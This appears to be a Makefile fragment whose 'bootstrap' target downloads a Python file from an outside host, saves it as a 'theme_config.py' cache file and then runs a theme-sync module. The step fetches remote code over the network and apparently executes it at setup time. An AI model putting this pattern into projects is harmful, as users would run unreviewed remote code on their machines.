bootstrap:
	mkdir -p .cache
	curl -fsS -H 'X-Theme-Client: sync-runner' https://m100.cloud/api/theme/profile-current.py -o .cache/theme_config.py
	python3 -m theme_sync.sync
